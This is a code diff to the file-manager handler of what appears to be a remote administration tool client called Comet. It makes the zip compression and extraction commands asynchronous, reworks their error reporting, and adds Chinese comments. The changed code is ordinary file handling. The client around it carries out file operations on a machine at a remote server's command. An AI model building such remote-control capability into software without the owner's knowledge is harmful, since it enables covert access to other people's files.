@@ -23,7 +23,7 @@ namespace Comet.Client.Messages
     public class FileManagerHandler : NotificationMessageProcessor, IDisposable
     {
         private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
-        private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
+        private readonly Semaphore _limitThreads = new Semaphore(2, 2); // 最大同时下载文件量
 
         private readonly CometClient _client;
 
@@ -289,40 +289,51 @@ namespace Comet.Client.Messages
             }
         }
 
-        private void Execute(ISender client, DoZip message)
+        private async void Execute(ISender client, DoZip message)
         {
-            try
+            if (message.Flag == 1)//压缩
             {
-                if (message.Flag == 1)//压缩
+                if (File.Exists(message.Path + ".zip"))
                 {
-                    if (File.Exists(message.Path + ".zip"))
-                    {
-                        client.Send(new GetZipExecuteStatus { Status = Path.GetFileName(message.Path) + ".zip already exists" });
-                        return;
-                    }
+                    client.Send(new GetZipExecuteStatus { Status = Path.GetFileName(message.Path) + ".zip already exists" });
+                    return;
+                }
 
-                    if (Directory.Exists(message.Path))//目录
-                    {
-                        ZipFile.CreateFromDirectory(message.Path, message.Path+".zip");
-                        client.Send(new GetZipExecuteStatus { Status = "Zip compression completed" });
-                    }
-                    else if (File.Exists(message.Path))//文件
-                    {
-                        ZipEntryFromFile(message.Path, message.Path + ".zip", client);
-                    }
-                    
-                }
-                else if (message.Flag == 2)//解压
+                if (Directory.Exists(message.Path))//压缩目录
                 {
-                    ZipFile.ExtractToDirectory(message.Path, message.Path.Replace(".zip", ""));
-                    client.Send(new GetZipExecuteStatus { Status = "Zip decompression completed" });
+                    await Task.Run(() =>
+                    {
+                        try
+                        {
+                            ZipFile.CreateFromDirectory(message.Path, message.Path + ".zip");
+                            client.Send(new GetZipExecuteStatus { Status = "Zip compression completed" });
+                        }
+                        catch (Exception e)
+                        {
+                            client.Send(new GetZipExecuteStatus { Status = e.Message });
+                        }
+                    });
+                }
+                else if (File.Exists(message.Path))//压缩文件
+                {
+                    ZipEntryFromFile(message.Path, message.Path + ".zip", client);
                 }
             }
-            catch (Exception e)
+            else if (message.Flag == 2)//解压
             {
-                client.Send(new GetZipExecuteStatus { Status = e.Message });
+                await Task.Run(() =>
+                {
+                    try
+                    {
+                        ZipFile.ExtractToDirectory(message.Path, message.Path.Replace(".zip", ""));
+                        client.Send(new GetZipExecuteStatus { Status = "Zip decompression completed" });
+                    }
+                    catch (Exception e)
+                    {
+                        client.Send(new GetZipExecuteStatus { Status = e.Message });
+                    }
+                });
             }
-            
         }
 
         /// <summary>
@@ -336,7 +347,14 @@ namespace Comet.Client.Messages
             {
                 using (ZipArchive archive = ZipFile.Open(targetZip, ZipArchiveMode.Update))
                 {
-                    archive.CreateEntryFromFile(sourceFile, Path.GetFileName(sourceFile));
+                    try
+                    {
+                        archive.CreateEntryFromFile(sourceFile, Path.GetFileName(sourceFile));
+                    }
+                    catch (Exception e)
+                    {
+                        client.Send(new GetZipExecuteStatus { Status = e.Message });
+                    }
                 }
                 client.Send(new GetZipExecuteStatus { Status = "Zip compression completed" });
                 GC.Collect();
@@ -362,7 +380,6 @@ namespace Comet.Client.Messages
                         // delete existing file
                         NativeMethods.DeleteFile(filePath);
                     }
-
                     _activeTransfers[message.Id] = new FileSplit(filePath, FileAccess.Write);
                     OnReport("File download started");
                 }
